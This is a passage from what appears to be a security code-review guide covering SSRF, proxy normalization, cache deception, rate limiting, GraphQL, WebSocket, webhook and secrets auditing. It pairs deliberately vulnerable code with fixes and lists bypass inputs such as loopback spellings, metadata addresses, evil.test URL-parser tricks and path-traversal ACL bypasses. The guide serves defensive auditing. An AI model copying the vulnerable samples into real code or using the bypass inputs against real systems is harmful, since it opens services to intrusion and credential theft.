      contentDisposition: 'attachment',
    })
    await fs.promises.unlink(req.file.path)
    res.json({ id: key, name: req.file.originalname })
  })
```

### 19. Server-side request forgery (`ssrf-application-path`)

Any outbound request whose destination the caller influences: a webhook URL the user registers, an avatar-by-URL importer, a PDF or screenshot renderer, an RSS or OpenGraph fetcher, a link previewer, an SSO metadata or JWKS fetch by URL, an XML parser resolving an entity, a proxy route, an "import from URL" feature, and any redirect the HTTP client follows on the application's behalf.

**Read any existing deny-list against this list before accepting it, because the common shape of an incomplete one is "RFC 1918, link-local and cloud metadata" — and loopback is in none of those three.** A deny-list assembled that way leaves the canonical SSRF target reachable while looking thorough. The list must cover, at minimum:

- `127.0.0.0/8` and `0.0.0.0`, plus every alternate spelling of them — `2130706433`, `0177.0.0.1`, `127.1`, `[::1]`, `[::ffff:127.0.0.1]`, `[::]`.
- RFC 1918: `10/8`, `172.16/12`, `192.168/16`.
- CGNAT `100.64.0.0/10`, link-local `169.254.0.0/16`, benchmark `198.18.0.0/15`, `192.0.0.0/24`, multicast `224.0.0.0/4`, reserved `240.0.0.0/4`.
- IPv6: loopback `::1`, unique-local `fc00::/7`, link-local `fe80::/10`, and IPv4-mapped and NAT64 forms of everything above.
- Metadata endpoints by address *and* by name: `169.254.169.254`, `fd00:ec2::254`, `metadata.google.internal`, `100.100.100.200`, and `169.254.170.2` for container credential providers.

**And the mitigation the source recommended was the attack it described one bullet earlier.** "Resolve the hostname, check the IP, then connect" is precisely the DNS-rebinding time-of-check window: the resolver can answer with a public address for the validation lookup and a private one for the connection. Check-and-connect must be atomic. Two constructions do that:

1. **A pinned-IP dialer.** Resolve once, validate *every* A and AAAA record returned, then connect to the validated IP while carrying the original `Host` header and SNI. In Python this is a custom `socket.create_connection`/transport adapter; in Node a custom `lookup` in the agent options; in Go a `DialContext` with a `Control` hook that inspects the resolved address.
2. **An egress proxy that allowlists destinations**, with the application denied direct outbound network access. This is the version that survives new bypasses.

Also required, and each is a separate finding when absent:

- **Do not follow redirects**, or re-run the full validation on every hop. A `302` to `169.254.169.254` defeats a validator that only saw the first URL.
- **Allowlist the scheme.** `http` and `https` only — `file:`, `gopher:`, `dict:`, `ftp:`, `ldap:` and `jar:` all reach further than intended.
- **Parse with a real URL parser and compare against what the client will use.** `http://trusted.example@evil.test/`, `http://evil.test#@trusted.example/`, and a host with a trailing dot or Unicode confusable are the differentials that matter.
- **Blind SSRF is still SSRF.** No response body reaching the caller reduces the impact; internal port scanning by timing, and POSTing to an internal endpoint that acts, both remain.

```detector
match: |
  # app/importers/avatar.py
  import ipaddress, socket
  from urllib.parse import urlparse
  import requests

  def fetch_avatar(url: str) -> bytes:
      host = urlparse(url).hostname
      addr = ipaddress.ip_address(socket.gethostbyname(host))
      if addr.is_private or addr.is_link_local:
          raise ValueError("blocked")
      return requests.get(url, timeout=5).content
nomatch: |
  # app/importers/avatar.py
  import requests
  from app.net.pinned import PinnedIPAdapter, validate_all_records

  session = requests.Session()
  session.mount("https://", PinnedIPAdapter(validator=validate_all_records))
  session.mount("http://", PinnedIPAdapter(validator=validate_all_records))

  def fetch_avatar(url: str) -> bytes:
      # every A/AAAA record is validated and the connection is made to the
      # validated address, carrying the original Host and SNI; redirects are
      # not followed, so each hop must be requested and validated explicitly
      resp = session.get(url, timeout=5, allow_redirects=False, stream=True)
      resp.raise_for_status()
      return resp.raw.read(2 * 1024 * 1024, decode_content=True)
```

The `match` side is the shape to hunt for, not a strawman: it validates, it is written by someone who knows about SSRF, and it is still vulnerable.

**Be precise about what `ipaddress.is_private` does, because it is wider than most auditors assume and a wrong sentence here is the one that gets quoted back.** It returns `True` for `127.0.0.1`, `0.0.0.0`, `::1`, `::ffff:127.0.0.1`, `169.254.169.254` and `198.18.0.1` — loopback, the unspecified address, IPv6 loopback, the IPv4-mapped form and link-local are all covered, so **do not write that this check misses loopback**. The gaps are these four, and they are what the `match` side is vulnerable to:

- **CGNAT `100.64.0.0/10` returns `False`.** It is not in CPython's private-network set. Alibaba Cloud's metadata endpoint `100.100.100.200` sits inside that range, so this validator lets it through.
- **`socket.gethostbyname` resolves A records only.** A hostname with no A record and an AAAA record raises rather than validating, but a hostname with a public A record and a private AAAA record is validated on the public one while the client is free to connect over IPv6 — nothing here ever inspects the AAAA answer.
- **`gethostbyname` resolves once and `requests.get(url)` resolves again at connect time.** That is the DNS-rebinding window described above; recipe R4 carries it as the load-bearing case.
- **No scheme allowlist and redirects are followed.** `file:`, `gopher:` and `dict:` never reach the address check in a useful way, and a `302` to any of the blocked ranges is honoured because only the first URL was ever seen.

The correct place to say "the list omits loopback" is against a *hand-written* CIDR deny-list, which is the paragraph above — not against `ipaddress`.

```detector
match: |
  // src/webhooks/deliver.ts
  export async function deliver(subscription: Subscription, event: unknown) {
    return fetch(subscription.url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(event),
    })
  }
nomatch: |
  // src/webhooks/deliver.ts
  import { Agent } from 'undici'

  const egress = new Agent({ connect: { lookup: validatedLookup } })

  export async function deliver(subscription: Subscription, event: unknown) {
    const url = new URL(subscription.url)
    if (url.protocol !== 'https:') throw new Error('scheme not allowed')
    return fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(event),
      redirect: 'error',
      dispatcher: egress,
      signal: AbortSignal.timeout(5000),
    })
  }
```

### 20. Request smuggling and proxy normalization (`request-smuggling-and-proxy-normalization`)

Full desync proof needs the deployed proxy-origin pair and is out of reach of a repository review; say so rather than implying the class was cleared. What *is* repo-visible:

- **Headers trusted as facts.** `X-Forwarded-For`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL` and `Forwarded` are caller-supplied unless a trusted hop overwrote them. Used for rate-limit keys (item 22), for building absolute URLs (item 21), for access decisions, or for audit attribution, they are a finding. The fix is a configured trusted-proxy count or CIDR — Express `app.set('trust proxy', n)`, Django `SECURE_PROXY_SSL_HEADER` plus a fixed proxy, `ProxyFix(app, x_for=1)` in Werkzeug, `ForwardedHeadersOptions.KnownProxies` in ASP.NET — never "take the leftmost value".
- **Path-normalization disagreement between the proxy ACL and the application router.** A proxy that denies `/admin` and an origin that also serves `/admin/..;/`, `/%2e%2e/admin`, `//admin`, `/admin.`, or `/ADMIN` on a case-insensitive route table. Every ACL expressed as a path prefix in nginx, an ingress, a CDN rule or a WAF needs the near-miss list tested against the framework's own router.
- **Lenient parsers turned on deliberately.** Node's `insecureHTTPParser: true`, a hand-written HTTP parser, a reverse proxy assembled from `httputil.NewSingleHostReverseProxy` with a `Director` that rewrites paths by string concatenation.
- **Duplicate parameters and parser differentials.** `?perm=view&perm=edit` resolves to the first value in some stacks and the last in others; a proxy checking one and an app reading the other is an authorization bypass. Same for duplicate headers and for JSON bodies with a repeated key.

```detector
match: |
  // src/middleware/client-ip.ts
  export function clientIp(req: Request): string {
    const fwd = req.headers['x-forwarded-for']
    return (Array.isArray(fwd) ? fwd[0] : fwd?.split(',')[0]) ?? req.socket.remoteAddress
  }
nomatch: |
  // src/server.ts
  // one trusted hop in front of this app; Express then computes req.ip from
  // the rightmost untrusted entry rather than from the leftmost claim
  app.set('trust proxy', 1)

  // src/middleware/client-ip.ts
  export function clientIp(req: Request): string {
    return req.ip
  }
```

The normalization mismatch has its own shape, and the fix is never "tighten the proxy pattern" alone — a prefix ACL at the edge is a filter, not the authorization boundary. Both sides have to hold.

```detector
match: |
  # nginx/site.conf
  location /admin {
      deny all;
  }
  location / {
      proxy_pass http://app:8080;
  }
nomatch: |
  # nginx/site.conf
  # anchored and slash-tolerant at the edge, and the application authorizes the
  # same routes itself — see Checklist item 3 — so a normalization difference
  # between the two parsers cannot become an authorization bypass on its own
  location ~* ^/+admin(/|$) {
      deny all;
  }
  location / {
      proxy_pass http://app:8080;
  }
```

### 21. Cache poisoning and deception (`cache-poisoning-and-deception`)

Two directions, both cheap to check and easy to miss.

- **Poisoning: an unkeyed input reaches a cached response.** The cache key is normally method plus URL plus whatever `Vary` names. Anything else that changes the body — `X-Forwarded-Host` used to build absolute URLs, an `X-Forwarded-Scheme`, a language header, a feature-flag header, a caller-chosen CORS origin reflected into the response — is unkeyed, and one poisoned entry is served to everyone. Where such an input must influence the response, it must appear in `Vary` *and* the header list the CDN keys on.
- **Deception: a private response gets cached.** `Cache-Control: public` (or a missing `Cache-Control` with a CDN default) on an authenticated route; a personalized page cached at the edge; `s-maxage` on a response carrying a session-specific body; a CDN configured to cache by file extension, so `/account.css`, `/account/x.js` or `/account?.css` returns the victim's account page from a public cache. Authenticated responses need `Cache-Control: private, no-store` and, where a CDN is in front, a rule that never caches them.
- Also check: a `Set-Cookie` on a cacheable response, error pages cached with a 200, and a stale-while-revalidate window on anything user-specific.

```detector
match: |
  // src/routes/account.ts
  router.get('/account/summary', requireAuth, async (req, res) => {
    res.set('Cache-Control', 'public, max-age=300')
    res.json(await summaryFor(req.user.id))
  })
nomatch: |
  // src/routes/account.ts
  router.get('/account/summary', requireAuth, async (req, res) => {
    res.set('Cache-Control', 'private, no-store')
    res.set('Vary', 'Authorization, Cookie')
    res.json(await summaryFor(req.user.id))
  })
```

```detector
match: |
  # app/emails/links.py
  def password_reset_link(request, token):
      host = request.headers.get("X-Forwarded-Host") or request.host
      return f"https://{host}/reset?token={token}"
nomatch: |
  # app/emails/links.py
  from django.conf import settings

  def password_reset_link(request, token):
      # the canonical origin is configuration, never a request header
      return f"{settings.PUBLIC_BASE_URL}/reset?token={token}"
```

### 22. Rate limiting and request quotas (`rate-limiting-and-request-quotas`)

`API4:2023` and `API6:2023`. Three questions, in this order: is there a limit, what does it count, and is it on the flow or only on the endpoint.

- **Endpoints that need one regardless of product opinion**: login, password reset, MFA verification, OTP send and verify, registration, invite, email-change confirmation, search, export and report generation, bulk endpoints, anything that sends mail or SMS, and anything that costs money per call.
- **The key is where limiters fail.** Keyed on a raw `X-Forwarded-For` behind a proxy that does not normalize it, the limit is bypassable with one header per request — a real finding, and the one worth hunting even when a limiter exists. Keyed only on the account, an attacker rotates accounts; keyed only on IP, a NAT'd office shares one bucket. Credential stuffing needs a limit keyed on the *username* as well as the source.
- **An in-process store multiplies the limit by the replica count.** `express-rate-limit` with its default memory store behind four pods is a 4× limit that also resets on deploy. Where the limiter is authoritative, the store must be shared.
- **Flow-level limits.** `API6:2023` is about abuse that is legitimate per request: creating a thousand accounts, redeeming coupons, buying scarce inventory, following users, submitting reviews. A per-endpoint limit does not address it; the control is a quota on the business action, plus the anti-automation the product can bear.
- **Cost-shaped limits.** A maximum page size (`?limit=1000000`), a maximum result window, a maximum upload size, a maximum export row count, a timeout on every outbound call, and a cap on any operation whose cost is caller-chosen. For an LLM-backed endpoint, per-call cost limits are `denial-of-wallet-controls` in `llm-and-ai`; request counts stay here.

```detector
match: |
  // src/routes/auth.ts
  import rateLimit from 'express-rate-limit'

  const limiter = rateLimit({
    windowMs: 60_000,
    max: 20,
    keyGenerator: (req) => String(req.headers['x-forwarded-for'] ?? req.ip),
  })

  router.post('/login', limiter, loginHandler)
nomatch: |
  // src/routes/auth.ts
  import rateLimit from 'express-rate-limit'
  import RedisStore from 'rate-limit-redis'

  // app.set('trust proxy', 1) is configured in server.ts, so req.ip is the
  // address the trusted proxy observed rather than a caller-supplied header
  const limiter = rateLimit({
    windowMs: 60_000,
    max: 20,
    store: new RedisStore({ sendCommand: (...a) => redis.sendCommand(a) }),
    keyGenerator: (req) => `${req.ip}|${String(req.body?.email ?? '').toLowerCase()}`,
  })

  router.post('/login', limiter, loginHandler)
```

```detector
match: |
  # api/views.py
  @api_view(["GET"])
  def list_events(request):
      limit = int(request.GET.get("limit", 50))
      qs = Event.objects.filter(org=request.user.org).order_by("-created_at")[:limit]
      return Response(EventSerializer(qs, many=True).data)
nomatch: |
  # api/views.py
  MAX_PAGE = 200

  @api_view(["GET"])
  @throttle_classes([ScopedRateThrottle])
  def list_events(request):
      limit = min(max(int(request.GET.get("limit", 50)), 1), MAX_PAGE)
      qs = Event.objects.filter(org=request.user.org).order_by("-created_at")[:limit]
      return Response(EventSerializer(qs, many=True).data)
```

### 23. GraphQL API surface (`graphql-api-surface`)

**Every Apollo default named below is an Apollo Server **4** default** — introspection off under `NODE_ENV=production`, `allowBatchedHttpRequests` off, CSRF prevention shipped. Library defaults move between majors, and these are load-bearing for three grades. Read the major from the lockfile before relying on any of them, and where the version is not pinned, say so instead of asserting the default.

- **Introspection.** `__schema` and `__type` publish the entire API. Whether it is on is an environment question more often than a code question: Apollo Server 4 disables introspection when `NODE_ENV` is `production`, so a repository showing `introspection: true` may still be closed in production and a repository showing nothing may be open in a container that never sets `NODE_ENV`. Read the option *and* the environment plumbing, and where the deployed value cannot be established, say so and grade accordingly.
- **Depth, complexity and aliasing.** Without a depth limit one query recurses arbitrarily; without a complexity budget a shallow query with large list arguments does the same; with neither, the same expensive field aliased five hundred times multiplies the work while looking like one operation. `graphql-depth-limit`, `graphql-query-complexity` and `graphql-armor` are the usual controls. **Read the mounting slot, not only the import: these packages ship a different shape per server engine, and a control in the wrong slot is silently inert.** On Apollo Server 4 depth and cost arrive as *validation rules* — `new ApolloArmor().protect()` returns a `validationRules` array (built from `maxDepthRule` and `costLimitRule`) alongside its `plugins` array, and `graphql-depth-limit`'s `depthLimit(n)` goes in `validationRules` as well. The `maxDepthPlugin` and `costLimitPlugin` exports of the per-rule `@escape.tech/graphql-armor-*` packages are **Envelop** plugins, for Yoga and Envelop; Apollo's `plugins` array takes `ApolloServerPlugin` objects, so those exports placed there never run. A limit that rejects *after* execution is not a limit — see the proof recipe, whose resolver spies are also what settle an ambiguous wiring.
- **Batching.** An array of operations in one HTTP request divides any per-request rate limit by the batch size. Apollo Server 4 leaves `allowBatchedHttpRequests` off by default; where it is enabled, it needs a cap.
- **Field-level authorization applied at the type, not only at the root.** The same type is usually reachable through several parents, and a check placed on one root field leaves the others open. Enumerate paths to the sensitive field.
- **Error verbosity.** Even with introspection off, "Did you mean ...?" suggestions enumerate the schema, and unformatted errors leak resolver stack traces and SQL. Set a `formatError` that returns a code and a message, and disable field suggestions.
- **Mutations reachable by GET** are CSRF-able; Apollo Server 4 ships a CSRF-prevention check that requires a preflight-forcing header, and disabling it needs a reason.
- **Persisted queries.** Automatic persisted queries with an unbounded cache are a memory-exhaustion surface; an allowlist of persisted operation hashes is the strong configuration and also solves depth and complexity at a stroke.

```detector
match: |
  // src/graphql/server.ts
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    introspection: true,
    allowBatchedHttpRequests: true,
    formatError: (err) => err,
  })
nomatch: |
  // src/graphql/server.ts
  // Apollo's integration is the `ApolloArmor` wrapper from the aggregate
  // package. protect() returns { plugins, validationRules,
  // allowBatchedHttpRequests: false, includeStacktraceInErrorResponses: false },
  // and Apollo runs the depth and cost limits as *validation rules* — so
  // spread the whole object, then re-spread both arrays if you add your own.
  // The per-rule packages' `maxDepthPlugin`/`costLimitPlugin` are Envelop
  // plugins: in Apollo's `plugins` array they load and never run.
  import { ApolloArmor } from '@escape.tech/graphql-armor'

  const armor = new ApolloArmor({
    maxDepth: { n: 8 },
    costLimit: { maxCost: 5000 },
  })
  const protection = armor.protect()

  const server = new ApolloServer({
    typeDefs,
    resolvers,
    ...protection,
    plugins: [...protection.plugins],
    validationRules: [...protection.validationRules],
    introspection: process.env.NODE_ENV !== 'production',
    csrfPrevention: true,
    formatError: (formatted) => ({
      message: formatted.message,
      code: formatted.extensions?.code ?? 'INTERNAL',
    }),
  })
```

```detector
match: |
  // src/graphql/resolvers/invoice.ts
  export const resolvers = {
    Query: {
      invoice: async (_p, { id }, ctx) => {
        requireRole(ctx, 'billing')
        return ctx.db.invoice.findUnique({ where: { id } })
      },
    },
    Customer: {
      invoices: async (customer, _a, ctx) =>
        ctx.db.invoice.findMany({ where: { customerId: customer.id } }),
    },
  }
nomatch: |
  // src/graphql/resolvers/invoice.ts
  const scopedInvoices = (ctx, where) => {
    requireRole(ctx, 'billing')
    return ctx.db.invoice.findMany({ where: { ...where, orgId: ctx.orgId } })
  }

  export const resolvers = {
    Query: {
      invoice: async (_p, { id }, ctx) => (await scopedInvoices(ctx, { id }))[0] ?? null,
    },
    Customer: {
      invoices: async (customer, _a, ctx) =>
        scopedInvoices(ctx, { customerId: customer.id }),
    },
  }
```

### 24. WebSocket, SSE and gRPC streaming authorization (`websocket-and-sse-authorization`)

- **Origin is not checked on a WebSocket upgrade by default.** The same-origin policy does not apply, cookies *are* sent, and `ws` performs no origin validation unless a `verifyClient` or an `upgrade` handler does it. That combination is cross-site WebSocket hijacking: any page can open an authenticated socket to the application. Check the origin against an allowlist **and** require a credential the browser does not attach on its own.
- **Authorize each subscription, not just the connection.** A connection authenticated as user A that can subscribe to `orders:B` is the WebSocket form of BOLA. The channel or topic name is caller input.
- **Re-authenticate on reconnect**, and decide what happens when the credential expires mid-connection. A long-lived socket that outlives its token is a session that cannot be revoked.
- **Per-connection limits**: message size, message rate, subscription count, and an idle timeout. Streaming endpoints hold resources that a request/response limiter never sees.
- **SSE** shares the credential question; additionally, buffering proxies and header-stripping proxies change behavior, so an SSE endpoint that authenticates via a custom header may work in development and fail — or fall back to an unauthenticated path — in production.
- **gRPC**: register the auth interceptor before the handler and confirm the ordering in the server construction; do not enable server reflection in production (it is the gRPC equivalent of introspection); set deadlines on streaming methods; and remember that sensitive values in metadata are logged far more readily than values in the message body. Transport security itself is `tls-and-certificate-validation` in crypto — hand that half over rather than grading it here.

```detector
match: |
  // src/realtime/server.ts
  import { WebSocketServer } from 'ws'

  const wss = new WebSocketServer({ server })

  wss.on('connection', (socket, req) => {
    const session = parseSessionCookie(req.headers.cookie)
    socket.on('message', (raw) => {
      const msg = JSON.parse(String(raw))
      if (msg.type === 'subscribe') subscribe(socket, msg.topic)
    })
  })
nomatch: |
  // src/realtime/server.ts
  import { WebSocketServer } from 'ws'

  const ALLOWED_ORIGINS = new Set(['https://app.example.com'])

  const wss = new WebSocketServer({
    server,
    verifyClient: ({ origin, req }, done) => {
      if (!ALLOWED_ORIGINS.has(origin)) return done(false, 403, 'origin')
      done(true)
    },
  })

  wss.on('connection', async (socket, req) => {
    const session = await verifyBearer(new URL(req.url, 'http://x').searchParams.get('t'))
    if (!session) return socket.close(4401, 'unauthenticated')
    socket.on('message', (raw) => {
      const msg = JSON.parse(String(raw))
      if (msg.type === 'subscribe' && maySubscribe(session, msg.topic)) {
        subscribe(socket, msg.topic)
      } else {
        socket.close(4403, 'forbidden')
      }
    })
  })
```

The gRPC half has its own detector, because the two defects there — a published schema and an interceptor that is registered but not in the path — look nothing like the WebSocket shape.

```detector
match: |
  // src/grpc/server.ts
  const server = new grpc.Server()
  server.addService(billingService, handlers)
  addReflection(server)
  server.bindAsync('0.0.0.0:50051', serverCredentials, () => server.start())
nomatch: |
  // src/grpc/server.ts
  const server = new grpc.Server({ 'grpc.max_concurrent_streams': 100 })
  // the interceptor wraps every handler rather than sitting beside them, so a
  // method added later cannot be reachable without passing through it
  server.addService(billingService, withAuth(handlers))
  if (process.env.NODE_ENV !== 'production') addReflection(server)
  server.bindAsync('0.0.0.0:50051', serverCredentials, () => server.start())
```

### 25. API inventory and version deprecation (`api-inventory-and-version-deprecation`)

`API9:2023`. The finding here is a live route nobody is thinking about.

- **Old versions still served.** `/v1` kept alive "for one client", with the authorization fix applied only to `/v2`. Diff the guards across versions rather than reading the current one.
- **Specification drift.** The OpenAPI document says one thing and the router does another: undocumented routes, undocumented parameters accepted by a permissive body parser, and documented-but-removed endpoints that still resolve. Generate the route list from the framework's own registry and diff it against the specification; that diff is the deliverable.
- **"Internal" services that are reachable.** An admin API on a second port, a metrics endpoint, a queue-management UI, a service assumed to be behind the mesh. Reachability is deployment topology and cannot be settled here — write it as an assumption with the verification step, and grade the authorization gap on the assumption that it is reachable, because that is the direction that fails safe.
- **Doc, schema and reflection surfaces**: `/openapi.json`, `/v3/api-docs`, `/swagger-ui/index.html`, `/docs`, `/redoc`, GraphQL introspection, gRPC server reflection. These are item 4's exposure question; they are listed here too because they are also the inventory itself.
- **Routes a library registers on your behalf**, which no route file shows: `/socket.io`, a dev-server middleware left mounted, an image-optimization endpoint such as Next.js `/_next/image` whose `remotePatterns` allowlist governs whether it is an open image proxy (an outbound-fetch surface — grade it under [item 19](#19-server-side-request-forgery-ssrf-application-path)).
- Deprecation should be observable: a `Deprecation` and `Sunset` header, a metric on the old version's traffic, and a date.

```detector
match: |
  # config/routes.rb
  namespace :api do
    namespace :v1 do
      resources :invoices, only: [:index, :show]
    end
    namespace :v2 do
      resources :invoices, only: [:index, :show]
    end
  end

  # app/controllers/api/v2/invoices_controller.rb
  before_action :authorize_billing_access!
nomatch: |
  # config/routes.rb
  namespace :api do
    namespace :v1 do
      resources :invoices, only: [:index, :show]
    end
    namespace :v2 do
      resources :invoices, only: [:index, :show]
    end
  end

  # app/controllers/api/base_controller.rb
  class Api::BaseController < ActionController::API
    before_action :authenticate!
    before_action :authorize_billing_access!, if: :billing_scope?
  end
```

The point of that pair is the diff, not the annotation: the guard exists on `v2` and the same resource is still served by `v1`. Put the shared guard on the base controller so a version cannot be added without it.

### 26. Webhook handler integrity (`webhook-handler-integrity`)

Whether the handler verifies at all, when it verifies, and what it verifies over. The constant-time comparison itself is `hmac-and-constant-time-comparison` in crypto; everything else here is this lens's.

- **Verify before acting.** A handler that parses, writes a row, enqueues a job and *then* checks the signature has already done the work. Verification is the first statement.
- **Verify over the raw bytes.** Re-serializing the parsed JSON and signing that fails for whitespace and key order, so implementations that do it either reject valid deliveries or — worse — are written to normalize both sides and end up verifying something the sender never signed. In Express this means `express.raw({ type: 'application/json' })` on the webhook route, mounted *before* the global `express.json()`; in Django, `request.body` and not `request.POST`.
- **Reject stale timestamps and replays.** A signature with no timestamp binding is replayable forever. Enforce a window (five minutes is the common vendor default) and keep a short-lived seen-identifier set for idempotency.
- **One secret per sender per endpoint**, rotatable, and never in the URL — a webhook secret in a query string is logged by every hop (item 31).
- **Absence of the signature header must fail.** The `if (sig && !verify(sig))` shape passes when the header is missing; see [item 30](#30-error-handling-verbose-responses-and-fail-open-error-handling-and-verbose-responses).
- Check what the handler trusts from the payload: an event that names an account, an amount or a status is a caller-controlled fact until the signature proves the sender, and even then, re-fetching the object from the vendor's API is the stronger pattern for anything that moves money.

```detector
match: |
  // src/routes/webhooks.ts
  app.use(express.json())

  router.post('/webhooks/stripe', async (req, res) => {
    const event = req.body
    await applyBillingEvent(event)
    const sig = req.header('stripe-signature')
    if (sig && !verifySignature(JSON.stringify(req.body), sig)) {
      return res.status(400).send('bad signature')
    }
    res.json({ received: true })
  })
nomatch: |
  // src/routes/webhooks.ts
  // mounted before express.json() so the raw bytes survive
  router.post(
    '/webhooks/stripe',
    express.raw({ type: 'application/json' }),
    async (req, res) => {
      const sig = req.header('stripe-signature')
      if (!sig) return res.status(400).send('missing signature')
      let event
      try {
        event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET)
      } catch {
        return res.status(400).send('bad signature')
      }
      if (await alreadyProcessed(event.id)) return res.json({ received: true })
      await applyBillingEvent(event)
      await markProcessed(event.id)
      res.json({ received: true })
    },
  )
```

### 27. Third-party API response trust (`third-party-api-response-trust`)

`API10:2023`. A vendor being trusted as a company does not make its response trusted as input.

- **Rendered.** A description, name or HTML fragment from a vendor injected into the page is stored XSS with an extra hop. The sink rules in [item 15](#15-cross-site-scripting-and-output-encoding-xss-and-output-encoding) apply unchanged.
- **Parsed unsafely.** A vendor's XML through an entity-resolving parser, a vendor's YAML through an unsafe loader, a vendor's JSON through a polymorphic deserializer.
- **Followed.** A URL in a vendor response fetched by the application, or a redirect the client follows, is SSRF where the vendor is the attacker's proxy — a shape that also defeats an allowlist keyed on the vendor's hostname.
- **Believed.** A field used as an authorization fact: an `email_verified` flag, a plan or entitlement, a role mapping, a price. Where the vendor is an identity provider, claim validation is `oauth-oidc-flow-correctness` in crypto; where it is a business API, the check is that the application re-derives the fact rather than accepting it.
- **Unbounded.** No timeout, no response-size cap, no schema validation, and no behavior defined for a `200` carrying an HTML error page. This is also where a slow vendor becomes an outage.

```detector
match: |
  # app/integrations/catalog.py
  def sync_products():
      resp = requests.get(VENDOR_URL)
      for item in resp.json()["items"]:
          Product.objects.update_or_create(
              sku=item["sku"],
              defaults={"name": item["name"], "html_description": item["description"]},
          )
nomatch: |
  # app/integrations/catalog.py
  from pydantic import BaseModel, HttpUrl, constr

  class VendorItem(BaseModel):
      sku: constr(pattern=r"^[A-Z0-9-]{1,32}$")
      name: constr(max_length=200)
      description: constr(max_length=5000)

  def sync_products():
      resp = requests.get(VENDOR_URL, timeout=10)
      resp.raise_for_status()
      if len(resp.content) > 5 * 1024 * 1024:
          raise ValueError("vendor response too large")
      for raw in resp.json()["items"]:
          item = VendorItem.model_validate(raw)
          Product.objects.update_or_create(
              sku=item.sku,
              defaults={"name": item.name, "description_text": item.description},
          )
```

### 28. Third-party script integrity (`third-party-script-integrity-sri`)

The browser-side half of the supply chain; the package-manager half is `cicd-and-supply-chain`'s.

- Every `<script src>` and `<link rel="stylesheet">` pointing at a host the team does not control needs `integrity` and `crossorigin="anonymous"`. Without the `crossorigin` attribute the integrity check cannot run for a cross-origin resource.
- **Say the limit out loud rather than overselling SRI.** A subresource hash pins one file. A tag manager, a consent-management platform, an A/B testing loader, or any script whose job is to inject further scripts defeats it by design — the pinned file is a loader and its payload is not pinned. Where such a loader exists, the honest finding is that SRI does not bound it and the control has to be CSP plus a documented review of what the vendor may load.
- A versionless CDN URL (`.../dist/lib.js`, `@latest`, a rolling major) is mutable by the vendor even where a hash is present, because the hash will simply stop matching and someone will remove it.
- Scope the impact by what the script can reach: a script on the payment or authentication page reads the form; a script on a marketing page does not. Payment-page co-tenancy specifically is `payment-page-script-authorization` in `privacy-and-data-protection` — file the SRI defect here and hand that lens the page context.

```detector
match: |
  <!-- templates/base.html -->
  <script src="https://cdn.example.net/charts/dist/charts.min.js"></script>
  <link rel="stylesheet" href="https://cdn.example.net/charts/dist/charts.css" />
nomatch: |
  <!-- templates/base.html -->
  <script
    src="https://cdn.example.net/charts/4.2.1/charts.min.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous"
    defer
  ></script>
  <link
    rel="stylesheet"
    href="https://cdn.example.net/charts/4.2.1/charts.css"
    integrity="sha384-9ndCyUa6mp3+g4z6f0nZ8mDR4uUQVQ0y2mFDLDDy1D2c4Q5b4kRt0kSxV3rV5aVe"
    crossorigin="anonymous"
  />
```

### 29. Secrets in the browser bundle (`secrets-in-browser-bundle`)

Anything a bundler inlines ships to every visitor. The mechanisms: `NEXT_PUBLIC_*`, `VITE_*`, `REACT_APP_*` and any explicit `define` in the build config; `process.env.X` referenced from client code and statically replaced; a server-only module imported into a client component; data returned from a server-side data loader and serialized into the page (`__NEXT_DATA__`, a `window.__PRELOADED_STATE__`, an inline `<script type="application/json">`); and published source maps, which restore the original module structure and any string in it.

**Grade on what the value is, not on where it is.** Publishable keys are designed to be public — a Stripe `pk_live_`, a Firebase web config, a Mapbox public token, an analytics site key — and reporting them as leaked credentials burns the reader's attention on the entry that actually matters. What matters: a `sk_live_`, a service-account JSON, a database URL, a signing secret, an internal hostname or admin path that reveals topology, and any key whose scope is not read-only-public. Where the same variable name carries both meanings in different environments, say which you established and how.

The adjacent finding worth writing whenever you find a legitimate publishable key: publishable keys are only safe if the *server* enforces the authorization the key does not.

```detector
match: |
  # .env.production
  NEXT_PUBLIC_API_BASE=https://api.example.com
  NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_51Hxxxxxxxxxxxxxxxxxxxxxx
  NEXT_PUBLIC_ADMIN_TOKEN=e5f2a1c9d4b7
nomatch: |
  # .env.production
  NEXT_PUBLIC_API_BASE=https://api.example.com
  NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_51Hxxxxxxxxxxxxxxxxxxxxxx
  # server-only; never prefixed, never referenced from a client component
  STRIPE_SECRET_KEY=sk_live_51Hxxxxxxxxxxxxxxxxxxxxxx
```

```detector
match: |
  // app/dashboard/page.tsx
  import { getServerSession } from '@/lib/auth'

  export default async function Dashboard() {
    const session = await getServerSession()
    return <Client session={session} apiKey={process.env.INTERNAL_API_KEY} />
  }
nomatch: |
  // app/dashboard/page.tsx
  import { getServerSession } from '@/lib/auth'
  import { fetchSummary } from '@/lib/server/summary'

  export default async function Dashboard() {
    const session = await getServerSession()
    // the call that needs the key is made on the server; the client receives
    // the result, not the credential
    const summary = await fetchSummary(session.userId)
    return <Client user={{ id: session.userId, name: session.name }} summary={summary} />
  }
```

### 30. Error handling, verbose responses and fail-open (`error-handling-and-verbose-responses`)

`A10:2025`. Two halves: what the error tells the caller, and what a failure makes the application decide. The second is the dangerous one.

**Fail-open shapes, in the order they are missed:**

- `except Exception: return True` (or `return user`, or `return DEFAULT_ROLE`, or an empty policy set, or a cached allow) inside an authorization helper, a token introspection call, a JWKS fetch, a feature-flag lookup or a policy-service client.
- **A guard that only runs when the input is present**: `if (sig && !verify(sig))`, `if header in request and not valid(header)`, `if (token) { check(token) }`. Absence of the credential skips the check entirely.
- A timeout or connection error to a policy, entitlement or payment service treated as a pass, frequently written as a resilience improvement and reviewed as one.
- A malformed-but-successful response handled as success: an empty body, `{}`, `null`, or an HTML error page with status 200 — parsed into a permissive default.
- Partial failure leaving an inconsistent state: user created but access-control row not written, entitlement granted before payment confirmed, refund issued twice because the second leg failed after the first committed.
- A retry loop with no cap or backoff that turns a dependency's bad minute into an outage and a bill.

